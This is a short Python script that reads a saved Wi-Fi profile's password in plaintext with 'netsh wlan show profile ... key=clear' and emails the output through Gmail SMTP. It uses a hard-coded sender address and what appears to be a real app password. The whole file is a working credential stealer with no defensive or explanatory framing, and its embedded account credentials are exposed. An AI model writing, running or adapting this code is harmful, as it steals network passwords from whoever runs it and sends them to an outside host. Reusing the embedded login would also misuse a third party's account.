import subprocess
import smtplib


def send_mail(email, password, message):
    with smtplib.SMTP("smtp.gmail.com", 587) as connection:
        connection.starttls()
        connection.login(user=email, password=password)
        connection.sendmail(email, email, message)

command = "netsh wlan show profile POCO C31 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("demo8552051878@gmail.com", "yojwiabucqzxammo", result)